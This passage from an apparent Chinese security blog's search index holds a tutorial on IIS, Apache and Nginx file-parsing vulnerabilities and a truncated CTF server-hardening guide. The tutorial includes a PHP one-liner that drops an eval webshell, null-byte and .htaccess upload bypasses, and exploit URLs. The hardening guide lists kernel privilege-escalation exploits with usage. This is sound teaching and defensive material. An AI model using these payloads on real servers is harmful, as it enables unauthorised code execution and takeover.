&#x2F;Users&#x2F;mtdp&#x2F;Library&#x2F;Android&#x2F;sdk&#x2F;tools\n.&#x2F;monitor\nMonitor的logcat中，并未打印出换行的数据。\n","categories":["Android"],"tags":["Android"]},{"title":"文件解析漏洞总结","url":"/2019/05/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","content":"解析漏洞总结IIS解析漏洞\n\nIIS特殊后缀解析：IIS默认配置下有一些特殊后缀名的可执行文件，如IIS6.0 默认的可执行文件除了asp还包含.asa、.cer、.cdx。这些后缀名可能被用于绕过黑名单策略。\n\nIIS6.0\n\n目录解析：.asp、.asa目录下的所有文件会被当成asp文件执行，如：/xx.asp/xx.jpg\n文件解析：IIS6.0下分号后面的不被解析，如：shell.asp;.jpg\n\n\nIIS7&#x2F;7.5  PHP-CGI解析漏洞\n\n在Fast-CGI运行模式下，由于cgi.fix_pathinfo参数得递归向前修正，在URL后面加上不存在的路径/xx.php ，如：/1.jpg/xx.php，会将1.jpg解析为php 文件。Nginx也有类似CGI漏洞。\n注：php5.3.9及以上版本增加了security.limit_extensions参数，该参数配置项限制了fastcgi解析文件的类型，配置为“.php”代表仅允许执行.php后缀的文件，可防止Web服务的错误配置带来的代码执行。\n\n\n\n\nApache解析漏洞\n\n多后缀解析：Apache 根据配置文件mime.types中定义的内容把后缀名文件交给对应的应用程序处理，且从右到左开始解析后缀名，如果不识别就再往左判断。攻击者可能会在文件后缀末尾添加Apache无法识别的后缀，导致绕过黑名单策略。如shell.php.rar， .rar 这两种后缀apache不可识别解析，就会继续往左解析成 shell.php。\n特殊后缀解析：Apache PHP配置文件中的默认正则匹配规则可匹配到特殊后缀名并将其作为php执行。如php5.6的正则表达式.+\\.ph(p[3457]?|t|tml)$可匹配执行php、php3、php4、php5、php7、pht、phtml后缀名。\n.htaccess解析：.htaccess是Apache提供的一种可作用于当前目录及其子目录的特殊配置文件，如果网站开启了.htaccess功能，攻击者可能上传.htaccess文件覆盖apache文件解析规则，从而导致解析漏洞产生。\n错误配置文件解析：配置文件配置错误导致的解析漏洞\nmime.types配置不当：mime.types可以把文件后缀名映射到对应的MIME类型,使文件被正常解析处理，如果在该文件中错误配置了解析规则，则会导致解析漏洞。\n站点文件配置不当：Apache具有多个配置文件，由于配置文件加载顺序不同，可能导致重复或冲突的规则被覆盖而不起作用，从而导致解析漏洞\n\n\n\nNginx解析漏洞\n\n空字节代码执行漏洞\n\n低版本Nginx（0.5.x、0.6.x、 0.7 &lt;&#x3D; 0.7.65、 0.8 &lt;&#x3D; 0.8.37）在遇到%00空字节时因为与后端FastCGI处理不一致，导致末尾包含空字节%00的文件时也能被按照php后缀解析执行。攻击者可以Nginx在图片中嵌入PHP代码 ，通过访问xxx.jpg%00.php来执行其中的代码。\n\n\nURI检查逻辑绕过漏洞（CVE-2013-4547）\n\nNginx（0.8.411.4.3,1.5.x1.5.6）在处理HTTP请求时会进行URI安全检查防止产生截断问题，正常URI检查逻辑下遇到“\\0”字符会认为是非法请求，但nginx 0.8.41之后的一些版本出于兼容性考虑允许路径中存在空格，且当路径中出现空格字符时会进入其他URI检查逻辑，但该逻辑中没有对“\\0”字符进行判断，导致攻击者利用非编码空格字符0x20可绕过黑名单策略上传文件，并利用\\0截断执行任意代码。\n举例，Linux环境下，服务器使用黑名单策略限制上传php后缀文件，在上传文件时使用BurpSuite修改文件名为1.jpg[0x20]，文件名后是一个十六进制的空格字符，上传成功后访问1.jpg[0x20][0x00].php即可执行代码。\n该漏洞是利用空格字符的检查逻辑进行绕过，因此需要上传带空格的文件到服务器然后进行访问，但通常网站会将文件重命名或去除特殊字符，导致在Linux环境下该漏洞利用条件较为苛刻，而Windows默认会去掉文件名后的空格，在Windows上利用时该漏洞时只需要上传任意文件，访问时在URL后添加[0x20][0x00]字符即可。\n\n\n\n\n系统特性导致的解析问题\n\nWindows没有对扩展名进行大小写转换，可以大小写绕过\n\nWindows下以.或者空格结尾的文件系统会自动去除.与空格，可上传.asp.和.asp(空格)的文件绕过黑名单\n\nlinux下文件拓展名大小写敏感，如果上传php不被解析，可以试试上传pHp后缀的文件名\n\n\n0x00截断\n\n原因：0x00是十六进制表示方法，是ascii码为0的字符（不是空(Null)、空字符(“”)、空格0x20）。某些编程语言的相关函数处理时，会把该字符当做结束符，可以用于绕过文件名黑名单绕过。如：\nphp解释器是C语言开发（Zend引擎：编译、执行），在C语言中，0x00是字符串的结束标识符；\nJava（ &lt; JDK1.7.0_40）使用FileOutputStream来实现对上传内容的保存，对象的构造方法又调用了open函数，open函数是一个native method。它的实现体是由C语言实现的。\nJDK1.7.0_40（7u40）开始加上了对文件名是否存在\\00字符的检查。\n\n\n\n\n限制条件：PHP&lt;5.3.29，且GPC关闭。在php版本为5.3.29之后，就没有这种漏洞了。并且即使在5.3之前，这个%00截断也受限于GPC、addslashes过滤\n利用：burp上传文件名修改为1.php a，在raw中把20（对应空格）改成 00\n\nIIS解析漏洞特殊后缀名解析除了.asp、.aspx，IIS默认配置下有一些特殊后缀名的可执行文件.cer .asa .cdx。以IIS6.0为例，默认可执行的文件拓展名有.cer、.asa、.cdx等，可在IIS管理器的拓展映射中查看：“IIS管理器”-“网站”-右键-“属性”，在属性对话栏中点击“主目录”-“配置”。\n\n特殊后缀名解析是IIS本身的一个功能特性，但该功能特性被滥用可导致解析漏洞。如果网站进行了黑名单限制，攻击者可以上传这些特殊后缀名的文件，从而绕过黑名单限制执行Webshell代码。\n实际后缀可执行测试对比情况：\n\n\n\n\nWin2003+IIS6.0\nWin2008R2+IIS7.5\n\n\n\n.cer\n可执行\n可执行\n\n\n.asa\n可执行\n无法执行,浏览器访问404\n\n\n.cdx\n无法执行,浏览器访问直接被下载\n无法执行,浏览器访问404\n\n\nPS：查看应用拓展：\n\nIIS6.0：IIS管理器–网站–右键–属性，在属性对话栏中点击主目录–配置。\nIIS7.0及以上：IIS管理器–主页–处理程序映射\n\n\n文件&#x2F;目录解析漏洞IIS 5.x&#x2F;IIS 6.x在解析文件类型的代码设计部分存在安全缺陷，通过逆向分析核心处理库文件asp.dll可以知道，IIS 6.x在识别和处理文件类型时仅通过文件拓展名进行判断，识别拓展名时从左向右查找“.”符号，且遇到“;”、“&#x2F;”时会产生内存截断，截断后便不会继续向后解析。因此，该漏洞具有两种利用方法：\n1.文件解析\n构造包含“;”的文件名，例如up.asp;1.jpg，解析拓展名时因为被;截断，于是文件被解析成asp文件执行。上传此类名称的文件可以绕过上传的黑名单限制。\n\n**2.目录解析 **\n因为IIS6.0解析文件时遇到/时进行截断，不解析/号后面的内容，所以如果构造a.asp/xx.jpg形式的文件，解析时获取结果为a.asp，是asp类型，因此a.asp/xx.jpg 会被当作asp文件执行。\n但是正常情况下我们不能直接新建这样的文件，因为文件名里不能包含/符号，如果构造这种URL的话，可以提前建一个a.asp的目录，然后在这个目录里上传xx.jpg形式的文件，这样访问文件时a.asp/xx.jpg就会被解析成asp文件执行。\n利用场景：在目标网站创建.asp、.asp、.asa、.cer等名称的目录，然后向该目录上传任意拓展名的文件\n\nIIS7.x PHP CGI解析漏洞IIS7.x支持以FastCGI模式解析PHP请求，但此模式下存在路径解析漏洞。IIS将请求传递给PHP解析器处理，但由于PHP配置默认开启了cgi.fix_pathinfo参数，其作用是对路径进行修正使其符合CGI规范，如果不存在该路径就去掉这个路径继续解析，例如&#x2F;admin&#x2F;abcd&#x2F;，如果abcd不存在，就会继续向前解析到&#x2F;admin&#x2F;。\n因此，该漏洞的利用方式是上传其他拓展名的文件，访问时在路径后添加任意以“.php”结尾的路径名即可将该文件以php格式解析执行，如“s.jpg&#x2F;1.php”。因为php解析器在解析路径时发现1.php不存在，于是修正路径继续向前解析，所以s.jpg会作为php文件类型执行。该漏洞可以绕过文件上传时的黑白名单策略执行Webshell代码。\n\n一种常用的技巧是上传一个1.jpg或图片马文件，内容为下图所示代码。上传后访问路径1.jpg&#x2F;x.php，通过路径解析漏洞执行1.jpg中的php代码后，会在网站当前目录下创建一句话webshell文件s.php，连接密码为1。\n&lt;?PHP fputs(fopen(&#x27;s.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[1])?&gt;&#x27;);?&gt;\n\n然后访问1.jpg/.php，在当前路径下就会生成一句话木马shell.php，菜刀连接即可，密码为1.\n这种只要看到URL中路径名以.php结尾，便不检测路径是否存在就直接交给php处理的逻辑，导致了这种漏洞的出现，不仅是IIS7，Nginx部分版本也存在这种路径解析漏洞。Apache在解析时，会先判断路径或文件是否存在，如果存在才传给php处理，避免了cgi.fix_pathinfo去解析，因此不存在这个漏洞。\n解决该漏洞的方法之一是在php.ini配置文件中，将cgi_pathinfo=1取消注释并设置值为0，但修改该值可能会让应用程序可用性受到影响。\nphp5.3.9及以上版本增加了security.limit_extensions参数，该参数配置项限制了fastcgi解析文件的类型，配置为“.php”代表仅允许执行.php后缀的文件，可防止Web服务的错误配置带来的代码执行。\nApache解析漏洞多后缀名解析Apache 能够解析包含有多个后缀名的文件，因为在配置文件mime.types里定义了Apache能够处理的所有文件后缀名及其对应的处理程序。当客户端请求一个文件时，若匹配到后缀名在该列表中，便将该文件交给对应的程序处理并向前端返回对应的Content-type值，否则把该文件当做默认类型text&#x2F;plain处理，即直接返回文件内容。\n\nApache 在解析文件后缀名时的特性是：从右向左判断，当遇到无法识别的扩展名时会继续向左解析，直到找到可识别的后缀名为止。\n该特性会产生一定的安全风险，如果网站使用了黑名单策略不允许上传某类后缀结尾的文件，攻击者可在文件名后添加Apache无法识别的后缀名，从而绕过限制上传文件。解决该风险的有效方法是升级Apache版本至最新版，如果无法升级Apache，后端可使用白名单策略对上传文件的后缀进行校验。\n利用场景：可绕过黑名单策略，比如网站不允许上传.php后缀的文件，把名字改为.php.123后上传，这样apache从右往左解析时，解析到.php时文件执行，从而绕过了黑名单检测。\n特殊后缀解析针对Apache+PHP架构的网站，在apache的php配置文件中可以看到使用了正则表达式匹配文件后缀名。以php5.6为例:\n\n正则表达式&quot;.+\\.ph(p[3457]?|t|tml)$&quot;匹配到以php、php3、php4、php5、php7、pht、phtml后缀名结尾的文件时会把文件交给php解析器执行，因此存在一些特殊的可执行文件后缀名，如图4-46所示：\n\n同理，对于php7.4，默认可匹配的后缀名有：phar、php、phtml。\n如果网站使用了黑名单策略禁止上传某些后缀名文件，攻击者可以尝试上传php3、php4、php5、php7、pht、phtml等特殊后缀名的文件绕过上传策略执行恶意代码。\n类似的：\nphp: .phtml, .php, .php3, .php4, .php5, and .incasp: .aspxperl: .pl, .pm, .cgi, .libjsp: .jsp, .jspx, .jsw, .jsv, and .jspfColdfusion: .cfm, .cfml, .cfc, .dbm\n\n错误配置解析Apache相关配置文件中可以自定义文件的解析规则，但如果管理员配置不当，可能会产生解析漏洞。\nmime.types配置不当mime.types可以把文件后缀名映射到对应的MIME类型,使文件被正常解析处理。通常Linux下路径为/etc/mime.types，Windows下路径为C:/apache/conf/mime.types。查看/etc/mime.types/mime.types对PHP的定义：\n$ cat /etc/mime.types | grep php#application/x-httpd-php                        phtml pht php#application/x-httpd-php-source                  phps#application/x-httpd-php3                        php3#application/x-httpd-php3-preprocessed        php3p#application/x-httpd-php4                        php4#application/x-httpd-php5                                    php5\n\n如果在该文件中错误配置了类似规则如application/x-httpd-php  ssoo，则会导致ssoo后缀名结尾的文件被当做php程序执行。该特性适合用于隐藏webshell后门。\n\n站点文件配置不当Apache具有多个配置文件，由于配置文件加载顺序不同，可能导致重复或冲突的规则被覆盖而不起作用。常见配置文件如httpd.conf、apache2.conf、000-default.conf 、php.conf等。以&#x2F;etc&#x2F;apache2&#x2F;apache2.conf为例，常见错误配置有以下几种情况：\n&lt;FilesMatch &quot;info.ookk&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n如果配置了该规则，会将文件info.ookk文件当做php执行。\n\n除此以外，还有其他常见错误配置代码如：\nAddType application/x-httpd-php jpgAddHandler application/x-httpd-php php\n\n前者可造成所有的jpg文件被当做php解析；若错误配置了后者的代码示例，当文件名任意部分出现php时都会被作为php文件解析，如1.php.jpg。\n.htaccess文件覆盖.htaccess是Apache提供的一种可作用于当前目录及其子目录的特殊配置文件，用户可以通过该文件控制Web服务的自定义错误页面、自定义默认文档、设置域名重定向、设置网页重定向等。该文件可配置MIME类型映射，定义文件后缀的解析方式。如果网站启用了该功能且未限制上传.htaccess文件，攻击者可自定义解析规则并上传覆盖.htaccess文件，从而解析执行webshell代码。这种情况也属于错误配置问题，区别是对于攻击者来说.htaccess文件是可控的。\n利用场景：上传.htaccess配置文件，定义解析规则，把图片马解析成php文件执行。\n测试环境下开启.htaccess功能，需要在apache配置文件中将AllowOverride参数设置为all并加载mod_Rewrite模块（默认已加载）。\n开启.htaccess：Apache配置文件AllowOverride的值设置为all并开启rewrite_mod(默认开启状态)。\n1、修改Apache配置文件/etc/apache2/apache2.conf，设置AllowOverride的值为All。其他版本配置文件位置可能有变化\n&lt;Directory /var/www/&gt;        Options Indexes FollowSymLinks        AllowOverride All        Require all granted&lt;/Directory&gt;\n\n2、Apache加载mod_Rewrite模块(默认已开启)。加载该模块，需要在Apache的配置文件中写上：\nLoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so\n\nrewrite默认是开启状态\ncat /etc/apache2/mods-available/rewrite.load LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so\n\nUbuntu可能还需要执行命令加载生效：\nsudo a2enmod rewrite\n\n\n注意：Apache可能有多个配置文件，后加载的配置文件会覆盖先加载的配置文件中的配置。所以在某个配置文件中将AllowOverride设置成All，若是其后加载的某个配置文件中AllowOverride的设置是None，则会不生效。一般来说，先加载httpd.conf，再加载conf.d&#x2F;中的配置文件，最后加载sites-enabled&#x2F;中的配置文件。\n\n假设攻击者在网站当前目录下上传了.htaccess文件，其中中写入自定义解析规则：\n&lt;FilesMatch &quot;info.123123ookk&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n该规则的作用是将info.123123ookk文件作为php执行，在访问info.123123ookk文件时，可以看到文件被执行：\n\n同理，如果攻击者在.htaccess文件中写入其他影响范围更大或更隐蔽的规则，如将某类特殊后缀名全部解析成php执行，则会给网站带来巨大的危害。\nApache HTTPD换行符解析漏洞Apache HTTPD是一个HTTP服务器，它可以通过mod_php来运行PHP网页。Apache HTTPD 2.4.0~2.4.29版本中存在一个解析漏洞（CVE-2017-15715），它使用正则表达式来匹配文件结尾的后缀名，但该正则表达式存在缺陷，FilesMatch中的”$”实际上可以匹配到末尾的换行符，导致在遇到末尾包含换行符x0a的文件时也能被按照php后缀解析执行，利用该特性攻击者可以绕过网站的黑名单策略上传文件。如：\n&lt;FilesMatch \\.(php|php4|phtml)$&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n上传文件时使用Burp Suite拦截请求包，在hex模式下的文件后缀名尾部插入一个换行符0a。\n\n上传成功后在文件尾部添加%0a，访问即可执行代码。\n\n该漏洞利用条件较苛刻，如果网站开发者使用$_FILES[&#39;file&#39;][&#39;name&#39;]获取文件名时，会自动把换行符去掉，导致该漏洞失效。并且security.limit_extensions&#96;配置如果设置了.php，则默认只解析php后缀的文件，多一个换行符也不行。\nNginx解析漏洞Nginx PHP CGI 解析漏洞与IIS7.x FastCGI解析漏洞类似，Nginx以FastCGI模式解析PHP，PHP-FPM是FastCGI的进程管理器，Nginx将请求内容按照FastCGI协议格式封装，通过TCP报文传输给PHP-FPM解析。PHP-FPM将数据还原，执行SCRIPT_FILENAME变量值指向的PHP文件。但由于默认php配置文件中cgi.fix_pathinfo参数的作用，文件不存在时会修正路径向前递归解析，因此导致访问文件时在路径后添加任意以“.php”结尾的路径名即可将该文件以php格式执行。如访问“&#x2F;shell.jpg&#x2F;123.php”时，123.php实际上并不存在，此时PHP-FPM解析到不存在的路径&#x2F;123.php，cgi.fix_pathinfo参数生效，修正路径继续向前解析，因此会将shell.jpg作为PHP文件执行。\n空字节代码执行漏洞低版本Nginx（0.5.x,0.6.x, 0.7&lt;&#x3D; 0.7.65,0.8&lt;&#x3D; 0.8.37）在遇到%00空字节时因为与后端FastCGI处理不一致，导致末尾包含空字节%00的文件时也能被按照php后缀解析执行，利用该特性攻击者可绕过网站的黑白名单策略上传文件并执行文件中的恶意代码。如在图片中嵌入PHP代码，上传图片1.jpg后访问1.jpg%00.php即可执行图片中的恶意代码。\nNginx URI检查逻辑绕过漏洞（CVE-2013-4547）Nginx（0.8.411.4.3,1.5.x1.5.6）在处理HTTP请求时会进行URI安全检查防止产生截断问题，正常URI检查逻辑下遇到“\\0”字符会认为是非法请求，但nginx 0.8.41之后的一些版本出于兼容性考虑允许路径中存在空格，且当路径中出现空格字符时会进入其他URI检查逻辑，但该逻辑中没有对“\\0”字符进行判断，导致攻击者利用非编码空格字符0x20可绕过黑名单策略上传文件，并利用\\0截断执行任意代码。\n\n该漏洞是利用空格字符的检查逻辑进行绕过，因此需要上传带空格的文件到服务器然后进行访问，但通常网站会将文件重命名或去除特殊字符，导致在Linux环境下该漏洞利用条件较为苛刻，而Windows默认会去掉文件名后的空格，在Windows上利用时该漏洞时只需要上传任意文件，访问时在URL后添加[0x20][0x00]字符即可。常见请求格式：\nwww.xxxx.com/1.jpg%00.phpwww.xxxx.com/1.jpg/%20\\0.php\n\n参考\nhttps://www.anquanke.com/post/id/219107\n\nFastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写\n\nhttps://blog.werner.wiki/file-resolution-vulnerability-iis/\n\nhttps://blog.werner.wiki/file-resolution-vulnerability-apache/\n\nhttps://blog.werner.wiki/file-resolution-vulnerability-nginx/\n\n\n","categories":["Web安全"],"tags":["文件解析"]},{"title":"CTF线下防御战—让你的靶机变成\"铜墙铁壁\"","url":"/2017/10/ctf%E7%BA%BF%E4%B8%8B%E9%98%B2%E5%BE%A1%E6%88%98%E2%80%94%E8%AE%A9%E4%BD%A0%E7%9A%84%E9%9D%B6%E6%9C%BA%E5%8F%98%E6%88%90-%E9%93%9C%E5%A2%99%E9%93%81%E5%A3%81/","content":"一. 前言　　随着CTF的普及，比赛的形式也有了越来越多的花样，对于线下赛来说，开始出现了安全加固或者防御战之类的环节，亦或者因为拿下靶机后不希望其他攻击者进入而进行“争夺”，无论什么形式，这些都需要我们对于服务器的防护工作有所了解。对于线下赛，笔者虽说没有什么很高超的攻防技巧，但也是有着一些自己的心得。本文总结了一些CTF线下赛中常用的服务器加固姿势，希望能对各位CTF朋友们有所帮助。环境针对目前常见线下赛常见的linux Web服务器，但是因为CTF毕竟与真实网络环境有很大区别，本文的涉及的大部分姿势不具有普遍适用性。本文涉及到的相关代码github下载地址：CTFDefense。\n二. 常用姿势1. 提权　　在开始正文之前，需要先提一下提权，这个要根据自己的比赛过程中的需要而定。有些比赛就有专门的防御加固环节，但安全加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般一开始会给一个普通权限账号，或者干脆什么都不给，需要我们自己通过漏洞拿下服务器，这样往往就需要提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。这里有一个网站：http://exploit.linuxnote.org/，里面有许多linux本地提权的poc。github上有一个挺全的提权exp项目：https://github.com/SecWiki/linux-kernel-exploits。网上也有人分享的一些打包搜集的poc,比如这个，有兴趣的朋友可以多下载看看。\n下面分享几个最近两年并且影响范围比较大的：\nCVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ）描述：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限用法：.&#x2F;pwnCVE-2016-5195（脏牛，kernel 2.6.22 &lt; 3.9 (x86&#x2F;x64)）描述：低权限用户可修改root用户创建的文件内容，如修改 &#x2F;etc&#x2F;passwd，把当前用户的 uid 改成 0 即可提升为root权限用法： .&#x2F;dirtyc0w file contentCVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）描述：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限用法：.&#x2F;chocobo_rootPOC： https://www.seebug.org/vuldb/ssvid-92567CVE-2017-1000367（sudo本地提权漏洞 ）CVE-2017-1000364描述：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。\nCVE-2016-1247（Nginx权限提升漏洞）\n描述：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx&#x2F;web 的用户权限 www-data 到 root 用户权限的提升。\nPOC：https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html\n　\n　提权相关代码在GetRoot目录，POC中是上面提到的几个本地提权源代码，release中分别是编译好的32位和64位程序。 \n\n实用脚本\n　　 Linux_Exploit_Suggester.pl ，它可以根据系统内核版本号返回一个包含了可能exploits的列表。还有一个检查linux安全状况的脚本：原文链接\n　　还有几个详见：Linux提权？这四个脚本可以帮助你\n2. 常用操作命令　　linux操作有很多命令，但是线下赛的防护工作中常用的也就那么一些，我们平时可以留意并总结起来，便于我们比赛使用。\nssh操作ssh &lt;-p 端口&gt; 用户名@IP　　//登录scp 文件路径  用户名@IP:存放路径　　//向ssh服务器上传输文件备份web目录　　tar -zcvf web.tar.gz /var/www/html/用户管理　　w 　　//查看当前用户　　pkill -kill -t &lt;用户tty&gt;　　 //踢掉当前登录用户进程管理　　ps aux | grep pid或者进程名　　//查看进程信息　　查看已建立的网络连接及进程　　netstat -antulp | grep EST　　查看指定端口被哪个进程占用　　lsof -i:端口号 或者 netstat -tunlp|grep 端口号　　结束进程命令　　kill PID　　killall &lt;进程名&gt;　　kill -9 &lt;PID&gt;iptables命令　　封杀某个IP或者ip段，如：123.4.5.6　　iptables -I INPUT -s 123.4.5.6 -j DROP　　iptables -I INPUT -s 123.4.5.1/24 -j DROP　　禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6　　iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROPMysql数据库操作　　备份mysql数据库　　mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　//备份指定数据库　　mysqldump --all-databases &gt; bak.sql　　　　//备份所有数据库　　还原mysql数据库　　mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql安全检查　　find / *.php -perm 4777 　　 //查找777的权限的php文件 　　awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd　　//查看root权限的账号　　crontab -l　　//查看计划任务　　检测所有的tcp连接数量及状态　　netstat -ant|awk &#x27;&#123;print $5 &quot;\\t&quot; $6&#125;&#x27; |grep &quot;[1-9][0-9]*\\.&quot;|sed -e &#x27;s/::ffff://&#x27; -e &#x27;s/:[0-9]*//&#x27;|sort|uniq -c|sort -rn　　查看页面访问排名前十的IP　　cat /var/log/apache2/access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　查看页面访问排名前十的URL　　cat /var/log/apache2/access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　\n\n　　再推荐两篇篇安全应急排查手册：应急排查手册 ，Linux应急响应姿势浅谈\n3. 文件监控防webshell　　防御webshell，我们可以监控我们的web目录，对文件的增加或修改等操作进行限制等，粗暴一点的话，就禁止任何文件产生变化，杜绝被传webshell的可能性。\n（1）使用系统 chattr +i 命令　　linux下的文件有着隐藏属性，可以用lsattr命令查看。其中有一个i属性，表示不得更动任意文件或目录。如果你已经有root或者sudo权限了，那么你可以使用”chattr +i 命令”修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括root），如果想进行修改，必须用命令”chattr -i”取消隐藏属性。Linux文件保护禁止修改、删除、移动文件等,使用chattr +i保护\n\n例子：用chattr命令防止系统中某个关键文件被修改：\nchattr +i /etc/profile \n\n将&#x2F;var&#x2F;www&#x2F;html目录下的文件设置为不允许任何人修改：\nchattr -R +i /var/www/html \n\n\n（2）自己动手丰衣足食　　python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，线下赛中通常没法联网安装库，所以我们可以手工把库文件传到靶机里python库中: &#x2F;usr&#x2F;lib&#x2F;pythonXXX&#x2F;site-packages，但是更方便的做法是借用pyinstaller等工具将其打包成linux可执行文件。\n　　安装了pyinotify库之后，我们仅仅运行在机器上： “python -m pyinotify 监控目录路径” 这条简单的命令，就可以看到对这个目录以及该目录下所有进行任何操作的的监控日志。\n 　　但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以自己编程，针对性地实现我们需要的功能，下面是一段代码示例。\n　　　　关于pyinotify 库的用法不再赘述，可以看到我在上述代码中创建了一个事件监控处理的类EventHandler，在这个示例中，我们仅仅关注创建、删除、修改属性、移动操作事件，并且我定义了一个DeleteFileOrDir方法用于自动删除增加的目录或者文件。运行测试截图：\n\n　　我们可以编写功能更加细化的程序，实现如监控文件变更，禁止创建、修改、删除任何文件或目录，自动删除新增文件，把被修改的文件改回去, 删除畸形隐藏文件等功能。我们使用pyinstaller把我代码打包为linux的elf可执行文件。-F参数表示打包为独立可运行文件，命令执行完之后自动生成：build、dist文件夹和SimpleMonitor.spec文件，你可以在dist目录里找到生成的elf程序。\n\n 打包的文件在CTFDefense项目的Monitor目录下\n \n4. 网络监控断异常连接　　linux安全防护一定少不了 iptables了，使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。\n　　具体我们可以做哪些工作呢，举一些例子：\n（1）关闭所有网络端口，只开放一些比赛的必要端口，也可以防止后门的连接\n#开放sshiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT#打开80端口iptables -A INPUT -p tcp --dport 80 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT#开启多端口简单用法iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT\n\n#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPTiptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT\n\n（2）限制ssh登陆，进行访问控制\niptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP 　　//禁止从123.4.5.6远程登陆到本机iptables -A INPUT -s 123.4.5.6/24 -p tcp --dport 22 -j ACCEPT　　//允许123.4.5.6网段远程登陆访问ssh\n\n（3）限制IP连接数和连接速率\n　　我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问+_+\n单个IP的最大连接数为 30\niptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT\n\n单个IP在60秒内只允许最多新建15个连接\niptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT\n\n允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）\niptables -A INPUT -p tcp --dport 80 -m limit --limit 2/s --limit-burst 10 -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -j ACCEPT\n\n　　再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问~~\n（4）数据包简单识别，防止端口复用类的后门或者shell\n　　假设病毒木马程序通过22，80端口像服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。\niptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP\n\n（5）限制访问\n如果对方来势太凶，我们可以限制或者封杀他们的ip段。\niptable -t filter -A FORWARD -s 123.4.5.6 -d 123.4.5.7 -j DROP　　//禁止从客户机123.4.5.6访问123.4.5.7上的任何服务\n\n封杀123.4.5.6这个IP或者某个ip段\niptables -I INPUT -s 123.4.5.6 -j DROPiptables -I INPUT -s 123.4.5.1/24 -j DROP\n\n（6）过滤异常报文\n　　iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。\niptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN 　　　　　　　　#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识iptables -A INPUT -p tcp --syn 　　　　　　　　　　　　　　　　　　　　　　　 #匹配SYN标识位iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP 　　　　　 #检查所有的标识位，匹配到FIN URG PSH的丢弃iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP 　　　　　　　　　 #丢弃没标志位的包iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP　#匹配到SYN ACK FIN URG的丢弃iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP　　　　　　#匹配到SYN ACK FIN RST的丢弃iptables -A 